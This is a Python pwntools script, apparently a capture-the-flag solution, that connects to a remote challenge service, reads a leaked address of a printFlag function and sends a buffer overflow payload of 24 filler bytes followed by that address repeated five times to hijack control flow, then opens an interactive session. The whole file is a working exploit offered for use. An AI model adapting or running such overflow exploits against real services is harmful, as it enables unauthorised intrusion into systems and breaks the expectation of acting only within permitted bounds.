from pwn import *

#context.log_level = "debug"
remote_conn = True

IP = "ctfo.2pmc.net"
PORT = "10002"
FILENAME = "./pwn-dyn"

#libc = ELF("")
#ld = ELF("")

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    #p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("address of printFlag ")
print_flag_addr = int(p.recvline()[:-2], 16)
print_flag_addr = p64(print_flag_addr)

log.info(str(hex(u64(print_flag_addr))))
log.info(str(print_flag_addr))

p.sendlineafter(b"Enter the password:", b"A"*24 + print_flag_addr*5)

p.interactive()
